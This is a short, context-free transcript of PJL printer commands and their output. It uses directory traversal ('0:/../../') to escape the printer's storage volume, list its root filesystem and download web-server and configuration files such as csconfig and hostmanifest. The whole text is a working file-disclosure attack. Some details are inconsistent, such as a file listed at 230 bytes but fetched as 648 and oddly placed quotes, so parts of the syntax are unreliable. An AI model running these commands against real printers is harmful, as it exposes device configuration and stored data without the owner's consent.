````bash
Y=1
. TYPE=DIR
.. TYPE=DIR
PJL TYPE=DIR
PostScript TYPE=DIR
saveDevice TYPE=DIR
webServer TYPE=DIR

@PJL FSDIRLIST NAME="0:/../../" ENTRY=1
. TYPE=DIR
.. TYPE=DIR
etc TYPE=DIR
conf TYPE=DIR
home TYPE=DIR
rw TYPE=DIR
tmp TYPE=DIR
csr_misc TYPE=DIR
printer TYPE=DIR 


@PJL FSDIRLIST NAME="0:/../../printer/webServer/home"/ ENTRY=1
device.html TYPE=FILE SIZE=165
hostmanifest TYPE=FILE SIZE=230 

@PJL FSUPLOAD NAME="0:/../../printer/webServer/home"/hostmanifest OFFSET=0 SIZE=648
@PJL FSUPLOAD NAME="0:/../../printer/webServer/home"/device.html OFFSET=0 SIZE=165


@PJL FSDIRLIST NAME="0:/../../printer/webServer/default"/ ENTRY=1
csconfig TYPE=FILE SIZE=4520 

@PJL FSUPLOAD NAME="0:/../../printer/webServer/default/csconfig"

@PJL FSUPLOAD NAME="0:/../../home/default/readyjob"/ ENTRY=1
```